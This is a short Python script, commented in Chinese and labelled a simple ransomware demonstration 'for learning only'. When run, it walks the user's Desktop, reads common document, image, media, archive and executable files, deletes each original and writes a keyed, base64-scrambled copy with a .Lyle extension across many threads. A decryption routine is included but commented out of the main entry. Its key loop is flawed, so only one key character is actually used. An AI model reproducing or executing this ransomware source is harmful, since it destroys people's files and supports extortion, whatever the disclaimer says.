# -*- coding: utf-8 -*-
from os import listdir, remove
from os.path import isdir, isfile
from base64 import b64decode
from base64 import b64encode
from threading import Thread
from getpass import getuser
# 勒索病毒简单原理，仅供学习交流，禁止任何非法用途，否则后果自负
# 勒索病毒简单原理，仅供学习交流，禁止任何非法用途，否则后果自负
# 勒索病毒简单原理，仅供学习交流，禁止任何非法用途，否则后果自负
# 别在主机上跑，建议在虚拟机
# 别在主机上跑，建议在虚拟机
# 别在主机上跑，建议在虚拟机
# 定义一串密钥

key = 'Lyle123456'
file_list = []
# 定义黑名单
black_list = ['png', 'lnk', 'docx', 'doc', 'xls', 'pdf', 'jpeg', 'txt', 'gif', 'md', 'exe', 'mp3', 'mp4', 'zip', 'rar',
              'jpg']
write_list = ['lyle']


# 获取这个目录下所有非系统文件
def get_file(dit_path: str, mode='encryption'):
    # 如果模式为加密，就获取所有普通文件，否则，获取所有被加密后的文件
    # 如果没有权限，忽略
    if mode == 'encryption':
        flag = black_list
    elif mode == 'decryption':
        flag = write_list
    else:
        raise '请选择模式'
    try:
        # 获取到输入目录下的所有文件
        filelist = listdir(dit_path)
        for filename in filelist:
            index = filename.rfind('.')
            suffix = filename[index + 1:].lower()
            # 如果在黑名单中，就添加到数组
            if isfile(dit_path + filename) and (suffix in flag):
                jueduipath = dit_path + filename
                file_list.append(jueduipath)
            # 如果是目录，继续遍历
            elif isdir(dit_path + filename):
                get_file(dit_path + filename + '/',mode)
    except:
        pass

    return


# 对文件进行加密，先进行base64编码,再通过密钥进行加密
def encryption(old_list: list):
    for filename in old_list:
        with open(filename, "rb") as f:
            # 获取文件内容
            content = f.read()
            f.close()
            remove(filename)
            # 定义加密后的字符串
            encry_content = ''
            # 进行base64编码
            base_str = b64encode(content)
            for char in base_str.decode():
                index = 0
                encry_content += chr(ord(char) * ord(key[index]))
                index += 1
                if index == len(key) - 1:
                    index = 0
            with open(f'{filename}.Lyle', "wb") as f:
                f.write(encry_content.encode())
                f.close()


# 解密函数
def decryption(old_list: list):
    for filename in old_list:
        with open(filename, 'rb') as f:
            old_str = f.read()
            f.close()
            remove(filename)
            decry_content = ''
            # 解密
            for char in old_str.decode():
                index = 0
                decry_content += chr(ord(char) // ord(key[index]))
                index += 1
                if index == len(key) - 1:
                    index = 0
            decry_content = b64decode(decry_content)
            old_name = filename.replace(filename[filename.rfind('.'):], '')
            # 保存数据
            with open(old_name, "wb") as f:
                f.write(decry_content)
                f.close()



def run(ditname, mode='decryption'):
    # 获取加密文件为 decryption，获取普通文件为encryption
    get_file(ditname, mode=mode)
    func = decryption if mode == 'decryption' else encryption
    for i in file_list:
        for q in range(0, len(file_list), 50):
            old_list = file_list[q:q + 50]
            Thread(target=func, args=(old_list,)).start()


if __name__ == '__main__':
    try:
        # 对桌面所有文件进行加密
        run(ditname=f'C:/Users/{getuser()}/Desktop/', mode='encryption')
    except:
        pass
        # run(ditname=f'D:/Desktop/',mode="decryption")